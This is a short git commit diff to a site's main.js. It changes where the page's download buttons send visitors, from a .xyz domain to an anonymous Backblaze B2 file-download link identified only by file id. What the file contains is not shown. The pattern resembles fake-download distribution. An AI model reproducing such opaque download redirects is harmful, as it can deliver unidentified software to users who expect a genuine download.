3a6b7b5931b10f63f11da913f7dfceaa875c52e7
kuailianl88 <calorimeta@gmail.com>
2025-09-04 13:39:22 +0800

    Update main.js

--- js/main.js
+++ js/main.js
@@ -8,10 +8,11 @@ downLinks.forEach(function(link) {javascript:;
         event.preventDefault();
 
         // 执行跳转操作，替换下面的URL为您想要跳转的URL
-        window.location.href = "https://siguaeltfgoasm.xyz/";
+        window.location.href = "https://f005.backblazeb2.com/b2api/v1/b2_download_file_by_id?fileId=4_zce10df696d66b3179d810519_f119e1325b21c7ceb_d20250904_m053751_c005_v0501018_t0046_u01756964271109";
     });
 
 });
+
 
 
 
